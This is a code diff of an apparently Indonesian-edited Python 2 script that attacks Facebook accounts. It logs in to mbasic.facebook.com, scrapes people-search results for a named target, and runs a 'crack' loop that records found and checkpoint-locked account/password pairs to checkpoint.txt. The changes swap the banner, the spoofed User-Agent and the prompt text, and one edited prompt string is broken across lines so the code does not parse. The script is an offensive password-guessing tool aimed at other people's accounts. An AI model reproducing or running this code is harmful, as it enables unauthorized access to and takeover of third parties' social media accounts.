@@ -2,11 +2,6 @@ import requests,bs4,sys,os
 import requests,sys
 from multiprocessing.pool import ThreadPoo
 	
-	  '\e[1;34m' __  ___     ____  _   ___  ____
-  /  |/  /_ __/ / /_(_) / _ )/ __/ \033[0m|| Edited FM\033[1;96m
- / /|_/ / // / / __/ / / _  / _/   \033[0m|| Github.com/dz-id\033[1;96m
-/_/  /_/\_,_/_/\__/_/ /____/_/\033[0m     || FB.me/fathul4rt
-________________________________________________________
 	
 				  
 	class crack:			   
@@ -47,7 +42,7 @@ ________________________________________________________
 					self.cp.append("%s|%s"%(fl,i))
 					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
 			self.ko+=1
-			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r[Crack] %s/%s Dapat :%s # CP :%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 			
@@ -79,11 +74,12 @@ def search(fl,r,b):
 def dumpfl():
 	r=requests.Session()
 	r.get("https://mbasic.facebook.com/login")
-	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
+	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 8.0.1; Redmi Vivo Y93) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
 	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("?: email: "),"pass":raw_input("?: passs: ")}).url
 	if "c_user" in r.cookies.get_dict():
-		fl=raw_input("?: filename: ")
-		s=raw_input("?: search query: ")
+		fl=raw_input("? Simpan File
+			   ")
+		s=raw_input("?Nama Target")
 		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)
 	
 
